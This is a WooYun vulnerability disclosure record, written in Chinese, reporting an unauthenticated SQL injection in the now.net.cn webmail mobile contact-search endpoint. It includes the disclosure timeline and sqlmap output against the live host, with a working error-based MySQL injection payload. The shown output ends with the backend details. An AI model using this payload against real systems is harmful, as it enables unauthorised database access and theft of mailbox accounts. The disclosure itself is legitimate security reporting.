wybug_corp: 广东时代互联科技有限公司
wybug_detail:
漏洞详情 披露状态：   									2015-08-03：	细节已通知厂商并且等待厂商处理中									2015-08-07：	厂商已经确认，细节仅向厂商公开									2015-08-10：	细节向第三方安全合作伙伴开放									2015-10-01：	细节向核心白帽子及相关领域专家公开									2015-10-11：	细节向普通白帽子公开									2015-10-21：	细节向实习白帽子公开									2015-11-05：	细节向公众公开  简要描述： 直接套用xfkxfk的漏洞名吧。。反正都差不多@xfkxfk。------------------------------------------------和一中年妇女聊天，那个妇女说：“你们年轻人哪里有什么烦恼，到床上散散心马上就好了！” 详细说明：  数据库挺多的，不用登录。 WooYun: TodayMail某处无需登陆的SQL注入可轻松导致大量企业邮箱帐号被脱裤   $$怎么发钱那么快。。。注入点：/mobile/manager/contactList.php?cmd=Search&keyword=*
C:\Python27\sqlmap>sqlmap.py -u "http://webmail.now.net.cn//mobile/manager/contactList.php?cmd=Search&keyword=" --dbs         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150707}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 02:00:25[02:00:25] [WARNING] provided value for parameter 'keyword' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly[02:00:25] [INFO] resuming back-end DBMS 'mysql'[02:00:25] [INFO] testing connection to the target URLsqlmap got a 302 redirect to 'http://webmail.now.net.cn:80//mobile/index.php'. Do you want to follow? [Y/n] ysqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: keyword (GET)    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: cmd=Search&keyword=') AND (SELECT 1348 FROM(SELECT COUNT(*),CONCAT(0x717a6b7871,(SELECT (ELT(1348=1348,1))),0x716a787171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ('YsqT'='YsqT---[02:00:28] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.4.34, Apache 2.2.27back-end DBMS: MySQL 5.0[02:00:28]
